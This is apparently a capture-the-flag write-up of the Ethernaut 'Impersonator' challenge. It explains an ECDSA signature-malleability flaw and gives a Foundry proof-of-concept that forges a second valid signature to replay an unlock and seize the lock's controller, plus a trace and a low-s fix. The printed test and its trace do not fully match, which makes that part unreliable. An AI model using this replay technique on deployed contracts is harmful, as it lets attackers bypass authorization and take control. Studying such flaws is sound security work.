# Impersanator Challenge(ethernaut Challenge)


### Challenge Overview:
SlockDotIt’s new product, ECLocker, integrates IoT gate locks with Solidity smart contracts, utilizing Ethereum ECDSA for authorization. When a valid signature is sent to the lock, the system emits an Open event, unlocking doors for the authorized controller. SlockDotIt has hired you to assess the security of this product before its launch. Can you compromise the system in a way that anyone can open the door?

***Vulnerability***:
The smart contract is vulnerable to a signature malleability attack due to the lack of checks on the s value of an ECDSA signature. This allows an attacker to generate an alternative but still valid version of a signature that can be used to bypass signature uniqueness checks or replay restricted actions.

**Cause**:

ECDSA signatures (r, s, v) have two valid versions for every message:

   > (r, s, v)
   > (r, n - s, 27 ⬌ 28)
Where:
n is the secp256k1 curve order:

0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

The contract does not enforce that s is in the lower half of the curve```(s <= n / 2)```. As a result, two distinct but valid signatures can exist for the same message hash, and both will pass ecrecover.

### VulnerabilityCode:
```solidity
function changeController(
        uint8 v,
        bytes32 r,
        bytes32 s,
        address newController
    ) external {
        _isValidSignature(v, r, s);
        controller = newController;
        emit ControllerChanged(newController, block.timestamp);
    }
     
     function _isValidSignature(
        uint8 v,
        bytes32 r,
        bytes32 s
    ) internal returns (address) {
        address _address = ecrecover(msgHash, v, r, s);
        // require(_address == controller, InvalidController());
        if (_address != controller) {
            revert InvalidController();
        }

        bytes32 signatureHash = keccak256(
            abi.encode([uint256(r), uint256(s), uint256(v)])
        );
        require(!usedSignatures[signatureHash], "signer alreadyused");

        usedSignatures[signatureHash] = true;

        return _address;
    }

```
### Impact:

An attacker can:

1.Reuse a signature by creating a malleable version, bypassing replay protection (e.g., usedSignatures[keccak256(sig)] = true)

2.Impersonate a signer and perform unauthorized actions like changing contract ownership or draining funds.

3.Take over the controller in this specific case by using a malleable version of a previously used signature.

### Proof of code:
```solidity
contract ECLockerTest is Test {
    Impersonator public imp;
    address public nk_signer;
    uint256 private nk_signerPk;
    bytes32 public msgHash;
    uint256 public lockId;
    address public controller_nk;

    function setUp() public {
        nk_signerPk = 0xA11CE;
        nk_signer = vm.addr(nk_signerPk);
        imp = new Impersonator(0); //deploy the contract impersonator
        vm.startPrank(imp.owner());
        lockId = 1;

        //  Ethereum Signed Message Hash
        msgHash = keccak256(
            abi.encodePacked(
                "\x19Ethereum Signed Message:\n32",
                bytes32(lockId)
            )
        );

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(nk_signerPk, msgHash);
        bytes memory signature = abi.encodePacked(r, s, v);
        imp.deployNewLock(signature); //deploy the lock with Ethereum signed hash
        vm.stopPrank();
    }

    function testSignatureMalleability() public {
        ECLocker locker = imp.lockers(0); //EcLocker instance

        // Sign message again to get original signature
        (uint8 v1, bytes32 r1, bytes32 s1) = vm.sign(nk_signerPk, msgHash);

        // Duplicate signatres s in ECDSA graph: s2 = n - s1
        uint256 n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
        bytes32 s2 = bytes32(n - uint256(s1));

        // Try using both valid signatures

        // First usage (original signature)
        vm.prank(nk_signer);
        locker.open(v1, r1, s1);
        // Second usage (malicious signature)
        // This should fail in a secure contract
        uint8 v2 = v1 == 27 ? 28 : 27;

        vm.prank(nk_signer);
        locker.open(v2, r1, s2); //  this should fail in a secure contract

        locker.changeController(v2, r1, s2, nk_signer); // this should fail in a secure contract
        assertEq(
            locker.controller(),
            controller_nk,
            "Controller should be changed"
        );
    }
}

```
Even though the original signature has already been used,but ECDSA graph have two signatures this is vulnerability

### TestCase:
```yaml

an 1 test for test/Impersnator.t.sol:ECLockerTest
[PASS] testSignatureMalleability() (gas: 88082)
Traces:
  [88082] ECLockerTest::testSignatureMalleability()
    ├─ [5140] Impersonator::lockers(0) [staticcall]
    │   └─ ← [Return] ECLocker: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]
    ├─ [0] VM::sign("<pk>", 0xc9798da569c6ded6bd4b17373ef332b7c84d68cdec3f420f583dcd7b441ae31d) [staticcall]
    │   └─ ← [Return] 28, 0x803c3d50f6c6045271cffbbfa6321ffca565acf7e929e7c414a32ea755347241, 0x7c93e8acd34551d042421ba504a4e96c0e216884681a0e52f65e770894342c90
    ├─ [0] VM::prank(0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7)
    │   └─ ← [Return]
    ├─ [31965] ECLocker::open(28, 0x803c3d50f6c6045271cffbbfa6321ffca565acf7e929e7c414a32ea755347241, 0x7c93e8acd34551d042421ba504a4e96c0e216884681a0e52f65e770894342c90)
    │   ├─ [3000] PRECOMPILES::ecrecover(0xc9798da569c6ded6bd4b17373ef332b7c84d68cdec3f420f583dcd7b441ae31d, 28, 58002478631855971539320367201591076334196138846330609933668613418806804771393, 56348125607360146780372420456742903897957838190118489022110830123524616891536) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000e05fcc23807536bee418f142d19fa0d21bb0cff7
    │   ├─ emit Open(opener: 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7, timestamp: 1)
    │   └─ ← [Stop]
    ├─ [0] VM::prank(0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7)
    │   └─ ← [Return]
    ├─ [29965] ECLocker::open(27, 0x803c3d50f6c6045271cffbbfa6321ffca565acf7e929e7c414a32ea755347241, 0x836c17532cbaae2fbdbde45afb5b1692ac8d7462472e91e8c973e7843c0214b1)
    │   ├─ [3000] PRECOMPILES::ecrecover(0xc9798da569c6ded6bd4b17373ef332b7c84d68cdec3f420f583dcd7b441ae31d, 27, 58002478631855971539320367201591076334196138846330609933668613418806804771393, 59443963629956048643198564551945003954879726088956415360494333017993544602801) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000e05fcc23807536bee418f142d19fa0d21bb0cff7
    │   ├─ emit Open(opener: 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7, timestamp: 1)
    │   └─ ← [Stop]
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.77ms (1.80ms CPU time)

Ran 1 test suite in 15.17ms (4.77ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
nithin@ScateR:~/SCATERLABs/CTFs/EthernautChallenges$ 
```



### Recommendation :
Add a check to ensure the signature's s value is in the lower half order of the curve.
```solidity
require(
    uint256(s) <= 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0,
    "Invalid s value"
);

```
Also ensure v is either 27 or 28:
```solidity
require(v == 27 || v == 28, "Invalid v value");

```
This ensures all accepted signatures are in canonical form, which eliminates malleability.

